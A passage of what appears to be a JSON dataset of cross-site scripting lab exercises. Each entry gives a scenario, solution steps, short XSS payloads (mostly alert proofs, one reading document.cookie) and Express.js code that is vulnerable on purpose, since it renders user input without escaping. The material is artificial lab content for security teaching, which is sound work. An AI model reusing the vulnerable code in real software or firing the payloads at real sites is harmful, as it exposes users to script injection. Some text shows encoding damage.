      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let announcements = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/announcements', (req, res) => { const list = announcements.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body><h1>Announcements</h1>${list}</body></html>`); }); app.post('/admin/announce', (req, res) => { announcements.push(req.body.content); res.redirect('/announcements'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Webmail XSS in Subject Preview Tooltip",
      "Lab Description": "A webmail client shows incoming emails with subject preview tooltips. The subject is stored and directly reflected inside a tooltip using an HTML attribute without proper encoding. To solve: Inject an XSS payload in the email subject that executes JavaScript when the tooltip renders.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a crafted email to yourself with an XSS payload in the subject.",
        "Login and view the inbox.",
        "Hover over the subject line to trigger the tooltip.",
        "Observe script execution due to unescaped attribute context."
      ],
      "payloads": [
        "\" onmouseover=alert(1) x=\"",
        "' onmouseenter=alert(1) x='",
        "` onfocus=alert(1) x=`"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/inbox', (req, res) => { const list = messages.map(m => `<li title=\"${m.subject}\">${m.from}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.post('/send', (req, res) => { messages.push({ from: req.body.from, subject: req.body.subject }); res.redirect('/inbox'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in QR Code Generator Text Field",
      "Lab Description": "An online QR generator embeds the text input directly into a JavaScript function to generate the code. It fails to escape special characters in the input. To solve: Inject a payload that breaks out of the JS string and executes a script when generating the QR code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to the QR code generation page.",
        "Enter a crafted payload into the text field.",
        "Click 'Generate' to trigger the script.",
        "Observe the vulnerable inline JS executing your payload."
      ],
      "payloads": [
        "';alert(1);//",
        "`;alert(1)//",
        "\");alert(1);//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.use(express.urlencoded({ extended: true })); app.get('/qr', (req, res) => { const data = req.query.data || ''; res.send(`<html><body><script>generateQR(\"${data}\");</script></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS via URL Metadata Preview in Bookmark Manager",
      "Lab Description": "The app lets users save URLs and fetches a metadata preview using Open Graph scraping. However, the meta description is injected directly into the page without sanitization. To solve: Host a URL with malicious meta content and save it to the app.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a webpage with a crafted meta description containing an XSS payload.",
        "Add this link to the bookmark manager.",
        "Preview the bookmark and trigger the payload.",
        "Confirm that script executes from injected meta content."
      ],
      "payloads": [
        "<meta name=description content=\"<img src=x onerror=alert(1)>\">",
        "<meta property=og:description content=\"<svg/onload=alert(1)>\">"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const axios = require('axios'); const cheerio = require('cheerio'); const app = express(); const bookmarks = []; app.use(express.urlencoded({ extended: true })); app.post('/add', async (req, res) => { const url = req.body.url; const resp = await axios.get(url); const $ = cheerio.load(resp.data); const desc = $('meta[name=description]').attr('content') || ''; bookmarks.push({ url, desc }); res.redirect('/bookmarks'); }); app.get('/bookmarks', (req, res) => { const list = bookmarks.map(b => `<li>${b.url} - ${b.desc}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Dynamic Poll Result Label",
      "Lab Description": "A polling application shows poll results where labels are user-generated. These labels are rendered inside the DOM using innerHTML in a script block, leading to DOM-based XSS. To solve: Inject malicious HTML as a label to execute script when viewing results.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a new poll with a crafted label containing an XSS payload.",
        "Submit the poll and view the results.",
        "Observe script execution due to unsafe innerHTML usage."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const polls = []; app.use(express.urlencoded({ extended: true })); app.post('/create', (req, res) => { polls.push({ label: req.body.label }); res.redirect('/results'); }); app.get('/results', (req, res) => { const labels = polls.map(p => `<li>${p.label}</li>`).join(''); res.send(`<html><body><ul>${labels}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in E-Commerce Product Comparison Table",
      "Lab Description": "The platform allows users to compare products and attach notes to each item. These notes are reflected in a table and injected using raw HTML. No sanitization is done on note content. To solve: Inject a note that executes JavaScript when the table loads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add a product to the comparison list.",
        "Attach a malicious note to the item.",
        "Load the comparison table and verify script execution."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const items = []; app.use(express.urlencoded({ extended: true })); app.post('/compare', (req, res) => { items.push({ name: req.body.name, note: req.body.note }); res.redirect('/table'); }); app.get('/table', (req, res) => { const rows = items.map(i => `<tr><td>${i.name}</td><td>${i.note}</td></tr>`).join(''); res.send(`<html><body><table>${rows}</table></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Banking Portal Stored XSS in Internal Messaging System",
      "Lab Description": "A banking web application includes a secure internal messaging feature for communication between users and bank staff. The message content is rendered using `innerHTML` without sanitization, allowing stored XSS. To solve: Inject a message with a payload and trigger it by visiting the inbox.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in as a user and navigate to the messaging system.",
        "Send a message containing an XSS payload.",
        "Log out and log in as the receiving user.",
        "Access the inbox and trigger script execution.",
        "Observe stored payload execution in the context of the victim."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(`XSS`)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'xsslab', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.send('<form method=POST><input name=user><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.user; res.redirect('/inbox'); }); app.get('/send', (req, res) => { if (!req.session.user) return res.redirect('/login'); res.send('<form method=POST><input name=to><textarea name=body></textarea><button>Send</button></form>'); }); app.post('/send', (req, res) => { if (!req.session.user) return res.redirect('/login'); messages.push({ to: req.body.to, body: req.body.body }); res.redirect('/inbox'); }); app.get('/inbox', (req, res) => { if (!req.session.user) return res.redirect('/login'); let inbox = messages.filter(m => m.to === req.session.user); let html = '<h1>Inbox</h1><ul>'; inbox.forEach(m => { html += `<li>${m.body}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
    },
    {
      "Lab scenario": "E-commerce XSS in Wishlist Notes Feature",
      "Lab Description": "An e-commerce site allows users to attach notes to wishlist items. The notes are reflected using innerHTML when viewing the wishlist. Due to missing sanitization, this leads to reflected XSS. To solve: Inject a crafted payload into the note and revisit the wishlist.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add an item to the wishlist.",
        "Attach a note to the item with an XSS payload.",
        "Revisit the wishlist page.",
        "Trigger the payload when the note is rendered.",
        "Verify that the script executes."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); let wishlist = {}; app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'xss', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.send('<form method=POST><input name=user><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.user; wishlist[req.session.user] = []; res.redirect('/wishlist'); }); app.get('/wishlist', (req, res) => { if (!req.session.user) return res.redirect('/login'); let items = wishlist[req.session.user]; let html = '<form method=POST><input name=item><input name=note><button>Add</button></form><ul>'; items.forEach(entry => { html += `<li>${entry.item} - ${entry.note}</li>`; }); html += '</ul>'; res.send(html); }); app.post('/wishlist', (req, res) => { if (!req.session.user) return res.redirect('/login'); wishlist[req.session.user].push({ item: req.body.item, note: req.body.note }); res.redirect('/wishlist'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Project Management Tool XSS in Task Description",
      "Lab Description": "A project management tool allows users to describe tasks with detailed HTML content. Task descriptions are rendered without sanitization in the dashboard. To solve: Create a task with a malicious description that triggers XSS when viewed.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in and create a new task.",
        "Insert an XSS payload in the task description field.",
        "Save the task and navigate to the dashboard.",
        "Observe the payload executing within the dashboard.",
        "Confirm script execution in user context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/create', (req, res) => { res.send('<form method=POST><input name=title><textarea name=desc></textarea><button>Create</button></form>'); }); app.post('/create', (req, res) => { tasks.push({ title: req.body.title, desc: req.body.desc }); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { let html = '<h1>Tasks</h1><ul>'; tasks.forEach(t => { html += `<li>${t.title}: ${t.desc}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Healthcare Portal Reflected XSS in Appointment Notes",
      "Lab Description": "A healthcare scheduling portal allows patients to add optional notes when booking appointments. These notes are echoed in the confirmation screen without encoding. This leads to reflected XSS. To solve: Inject a crafted payload in the notes field and reach the confirmation page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the appointment booking form.",
        "Enter a malicious payload in the notes field.",
        "Submit the form and proceed to the confirmation page.",
        "Observe the reflected content in the response.",
        "Confirm payload execution in the browser."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=1 onerror=alert('XSS')>",
        "<svg/onload=alert(`XSS`)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/book', (req, res) => { res.send('<form method=POST><input name=name><input name=date><input name=note><button>Book</button></form>'); }); app.post('/book', (req, res) => { res.send(`<h1>Booking Confirmed</h1><p>${req.body.name} on ${req.body.date}</p><p>Note: ${req.body.note}</p>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Learning Management System XSS in Forum Post Preview",
      "Lab Description": "A learning platform includes a forum where users can preview their posts before submitting. The preview feature renders HTML from user input using innerHTML. There\u00e2\u20ac\u2122s no output encoding, leading to reflected XSS. To solve: Inject an XSS payload in a forum post preview and confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the forum and click 'New Post'.",
        "Enter an XSS payload in the content field.",
        "Click 'Preview'.",
        "The payload is rendered in real-time using innerHTML.",
        "Observe script execution in the preview section."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=1 onerror=alert('XSS')>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/forum', (req, res) => { res.send('<form method=POST action=/preview><textarea name=content></textarea><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { res.send(`<h1>Preview</h1><div>${req.body.content}</div>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Job Application Portal Reflected XSS in Search Suggestions",
      "Lab Description": "A job portal includes a search bar with live suggestions based on user input. The search term is reflected directly into the DOM using innerHTML without sanitization. This introduces DOM-based XSS. To solve: Inject a payload into the search query that executes when suggestions render.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit the job search page.",
        "Type a crafted payload into the search input.",
        "Observe how the search term is reflected in the suggestions list.",
        "Inspect how the script executes due to unsafe rendering.",
        "Confirm successful execution of payload in browser context."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><h1>Search</h1><ul id='results'></ul><script>document.getElementById('results').innerHTML = '<li>${q}</li>';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Travel Booking App XSS in Hotel Feedback Submission",
      "Lab Description": "Users of a travel booking app can submit feedback for hotels. Feedback comments are shown to future visitors. Since input is rendered without escaping, stored XSS is possible. To solve: Submit a malicious comment and confirm it executes when viewed.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to a hotel\u00e2\u20ac\u2122s feedback form.",
        "Submit a comment containing an XSS payload.",
        "Visit the hotel\u00e2\u20ac\u2122s page as a different user.",
        "View the feedback section to trigger the payload.",
        "Observe execution confirming stored XSS."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=1 onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/hotel', (req, res) => { let out = '<form method=POST><textarea name=comment></textarea><button>Submit</button></form><ul>'; comments.forEach(c => { out += `<li>${c}</li>`; }); out += '</ul>'; res.send(out); }); app.post('/hotel', (req, res) => { comments.push(req.body.comment); res.redirect('/hotel'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Learning Dashboard XSS in Achievement Notification",
      "Lab Description": "A gamified e-learning dashboard shows pop-up notifications using dynamic HTML when users earn badges. Badge names are inserted directly into HTML via template strings without encoding. To solve: Inject a payload into a badge name and wait for the notification to appear.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger badge creation through activity (e.g. completing a course).",
        "Inject an XSS payload into the badge name input.",
        "Trigger the system to show achievement notifications.",
        "Observe the injected content executing in a script context.",
        "Confirm DOM-based XSS execution via alert."
      ],
      "payloads": [
        "<img src=1 onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let badges = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/award', (req, res) => { res.send('<form method=POST><input name=name><button>Award</button></form>'); }); app.post('/award', (req, res) => { badges.push(req.body.name); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { let out = '<h1>Achievements</h1><ul>'; badges.forEach(b => { out += `<li><script>document.body.innerHTML += '<div>Badge earned: ${b}</div>'</script></li>`; }); out += '</ul>'; res.send(out); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Recipe Sharing Platform Reflected XSS in Title Preview",
      "Lab Description": "Users writing a new recipe can preview the recipe title before submission. The preview is done via client-side rendering using innerHTML with unescaped user input. This introduces reflected XSS. To solve: Inject a payload into the title field and preview the recipe.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the 'Create Recipe' page.",
        "Enter a malicious string in the title field.",
        "Click preview to trigger the reflection.",
        "Observe script execution in the preview area.",
        "Confirm the payload executes as part of DOM rendering."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/create', (req, res) => { res.send('<form method=POST action=/preview><input name=title><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { res.send(`<div>Preview: <span id=preview></span><script>document.getElementById('preview').innerHTML = '${req.body.title}'</script></div>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Online Survey Tool XSS in Response Review Panel",
      "Lab Description": "Survey results in this tool are shown in an admin panel where user-submitted answers are rendered as HTML. Lack of sanitization introduces a stored XSS vector. To solve: Inject a malicious answer and trigger it by viewing the admin review panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a survey response with a malicious answer.",
        "Log in as the survey creator or admin.",
        "Open the response review dashboard.",
        "Trigger the rendering of the malicious answer.",
        "Verify that the XSS payload executes in admin\u00e2\u20ac\u2122s context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let responses = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/survey', (req, res) => { res.send('<form method=POST><input name=answer><button>Submit</button></form>'); }); app.post('/survey', (req, res) => { responses.push(req.body.answer); res.redirect('/thankyou'); }); app.get('/admin', (req, res) => { let html = '<h1>Survey Responses</h1><ul>'; responses.forEach(r => { html += `<li>${r}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Fitness App Leaderboard XSS in Custom Username Field",
      "Lab Description": "Users can set a custom username which appears on the public leaderboard. The application renders usernames directly using innerHTML, creating a stored XSS vector. To solve: Inject a payload into the username and trigger its execution from the leaderboard page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Register a new account and set a malicious username.",
        "Access the leaderboard page where usernames are listed.",
        "Inspect how the username is rendered using innerHTML.",
        "Trigger the leaderboard view to display the payload.",
        "Verify XSS by observing execution of injected script."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let users = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/register', (req, res) => { res.send('<form method=POST><input name=username><button>Register</button></form>'); }); app.post('/register', (req, res) => { users.push(req.body.username); res.redirect('/leaderboard'); }); app.get('/leaderboard', (req, res) => { let out = '<ul>'; users.forEach(u => { out += `<li>${u}</li>`; }); out += '</ul>'; res.send(out); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Education Platform XSS in Quiz Result Summary",
      "Lab Description": "After completing a quiz, users receive a result summary that includes their name and score. The summary page renders these details using template literals inside script tags, allowing DOM-based XSS via the name field. To solve: Inject a payload in the name field to execute a script upon result viewing.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a quiz attempt with a malicious name value.",
        "Reach the summary page where the name is used in a script tag.",
        "Observe improper handling of user-controlled name value.",
        "Trigger payload rendering within the script block.",
        "Verify successful execution of the injected code."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "';alert(1);//",
        "\";alert(1);//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/quiz', (req, res) => { res.send('<form method=POST action=/summary><input name=name><button>Submit</button></form>'); }); app.post('/summary', (req, res) => { const name = req.body.name; res.send(`<html><head><script>let result = 'Student: ${name}'; document.title = result;</script></head><body><h1>Quiz Summary</h1></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Customer Support Ticketing XSS in Ticket Notes Viewer",
      "Lab Description": "Support agents can view user-submitted ticket notes in the admin dashboard. The application renders notes directly into the DOM using dangerouslySetInnerHTML in a templated admin UI. This leads to stored XSS. To solve: Submit a malicious note and verify execution upon admin view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a support ticket with a malicious note.",
        "Log in as a support agent and access the ticket viewer.",
        "Observe the note being rendered unsafely in HTML.",
        "Trigger payload execution when the admin views the ticket.",
        "Verify that the malicious script executes in admin's context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tickets = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/submit', (req, res) => { res.send('<form method=POST><textarea name=note></textarea><button>Send</button></form>'); }); app.post('/submit', (req, res) => { tickets.push(req.body.note); res.redirect('/thankyou'); }); app.get('/admin/tickets', (req, res) => { let html = '<h1>Tickets</h1><ul>'; tickets.forEach(t => { html += `<li>${t}</li>`; }); html += '</ul>'; res.send(html); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Project Management Tool XSS in Task Title Preview Modal",
      "Lab Description": "A project management tool provides a modal preview for task titles. User input is passed directly into innerHTML within the modal. Lack of sanitization introduces reflected XSS. To solve: Inject an XSS payload into the task title field and preview it to trigger execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the task creation form.",
        "Enter a task title with an XSS payload.",
        "Click the 'Preview' button to open the modal.",
        "Inspect how input is rendered inside the modal using innerHTML.",
        "Verify the script executes within the modal context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/task', (req, res) => { res.send('<form method=POST action=/preview><input name=title><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { const title = req.body.title; res.send(`<div id=modal></div><script>document.getElementById('modal').innerHTML = '<h2>${title}</h2>';</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Bookstore Review Section Stored XSS via Star Rating Comments",
      "Lab Description": "A review section in a bookstore web app allows users to leave comments with star ratings. These are rendered without escaping, introducing stored XSS. To solve: Submit a crafted review that triggers script execution when other users view it.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open a book page and submit a review with a payload.",
        "Include the payload in the comment field.",
        "Visit the book page again as another user.",
        "Observe the review section and detect the triggered payload.",
        "Verify execution of malicious content."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/book', (req, res) => { let html = '<form method=POST><input name=comment><button>Post</button></form><ul>'; reviews.forEach(r => { html += `<li>${r}</li>`; }); html += '</ul>'; res.send(html); }); app.post('/book', (req, res) => { reviews.push(req.body.comment); res.redirect('/book'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Content Collaboration XSS in Markdown Preview Panel",
      "Lab Description": "The collaboration platform provides a live Markdown preview panel. The application fails to sanitize embedded HTML within Markdown content and renders it directly inside an iframe. This opens up the possibility of script injection via raw HTML. To solve: Inject a script payload wrapped in Markdown and verify execution inside the preview pane.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login and navigate to the content creation area with Markdown support.",
        "Write a Markdown post that includes raw HTML like <script> tags.",
        "Observe how the preview pane renders this content in real-time.",
        "Craft a script payload using valid HTML/Markdown combinations.",
        "Trigger the XSS in the preview iframe."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const marked = require('marked'); app.use(bodyParser.urlencoded({ extended: true })); app.get('/editor', (req, res) => { res.send('<form method=\"POST\" action=\"/preview\"><textarea name=\"markdown\"></textarea><button>Preview</button></form>'); }); app.post('/preview', (req, res) => { const markdown = req.body.markdown; const html = marked(markdown); res.send(`<iframe srcdoc='${html}'></iframe>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Order Tracking XSS via Invoice ID in Print Preview",
      "Lab Description": "The order tracking system allows users to view a print-friendly version of their invoices. The invoice ID is reflected without encoding inside the HTML title and print header. To solve: Inject a payload into the invoice ID parameter and trigger script execution on the print preview page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to the invoice print preview feature using a valid invoice ID.",
        "Modify the ID parameter using a reflected XSS payload.",
        "Observe that the payload appears in the HTML title or inline print content.",
        "Craft payloads that work within HTML attributes or text nodes.",
        "Trigger XSS on the preview page."
      ],
      "payloads": [
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/print', (req, res) => { const id = req.query.id || '000'; res.send(`<html><head><title>Invoice ${id}</title></head><body><h2>Invoice #${id}</h2></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Social Sharing Metadata Injection",
      "Lab Description": "The blogging platform generates dynamic Open Graph and Twitter meta tags for each post based on user-defined titles and summaries. These values are not properly escaped, resulting in XSS when malicious scripts are injected via post titles. To solve: Inject an XSS payload into a new post title and visit its social sharing preview page.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Create a new blog post with a title containing a script payload.",
        "Publish the post and open the sharing metadata preview endpoint.",
        "Inspect the generated meta tags using browser DevTools.",
        "Identify improper escaping in meta attributes.",
        "Confirm XSS when rendering preview in social embed iframe."
      ],
      "payloads": [
        "\"><script>alert(document.domain)</script>",
        "' onerror='alert(1)",
        "\"><img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const posts = []; app.post('/new-post', (req, res) => { posts.push({ title: req.body.title }); res.redirect(`/preview-meta?index=${posts.length - 1}`); }); app.get('/preview-meta', (req, res) => { const post = posts[req.query.index]; res.send(`<html><head><meta property=\"og:title\" content=\"${post.title}\"><meta name=\"twitter:title\" content=\"${post.title}\"></head><body>Preview</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Shopping Cart Notes on Order Confirmation Page",
      "Lab Description": "The e-commerce platform allows customers to leave 'special notes' in their cart before checkout. These notes are injected into the order confirmation page without sanitization. To solve: Inject a malicious payload in the note field, complete the order, and trigger script execution on the confirmation page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add any product to the cart and proceed to checkout.",
        "Insert a malicious XSS payload in the 'order notes' field.",
        "Place the order and observe the order confirmation page.",
        "Inspect where the note appears and test for script execution.",
        "Verify successful payload delivery."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let lastNote = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/checkout', (req, res) => { res.send('<form action=\"/confirm\" method=\"POST\"><input name=\"note\" placeholder=\"Special instructions\"><button>Order</button></form>'); }); app.post('/confirm', (req, res) => { lastNote = req.body.note; res.redirect('/confirmation'); }); app.get('/confirmation', (req, res) => { res.send(`<html><body><h1>Order Confirmed</h1><p>Note: ${lastNote}</p></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Project Tag Input in Task Management App",
      "Lab Description": "A task management tool supports project-specific tags entered by users. These tags are displayed as interactive HTML elements but are not encoded before being rendered. To solve: Create a tag with embedded JavaScript and verify execution when the tag list is displayed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login and navigate to the project settings page.",
        "Create a tag with an XSS payload in the name.",
        "View the task list page where tags are listed.",
        "Identify the unsanitized output in the tag container.",
        "Confirm successful script execution."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('Tag XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tags = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/tags', (req, res) => { const list = tags.map(t => `<span>${t}</span>`).join(' '); res.send(`<html><body><div>${list}</div></body></html>`); }); app.post('/add-tag', (req, res) => { tags.push(req.body.name); res.redirect('/tags'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Feedback Subject in Support Portal Email Preview",
      "Lab Description": "A support portal allows users to submit feedback with a subject line that is shown in the email preview pane. The subject is not sanitized and is inserted inside the HTML body of the preview. To solve: Inject a payload in the subject field, then view the email preview as support staff and trigger script execution.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Access the feedback form on the support page.",
        "Submit feedback with a malicious payload in the subject.",
        "Login as staff and view the email preview feature.",
        "Observe the vulnerable injection point in the preview template.",
        "Trigger the XSS payload execution."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
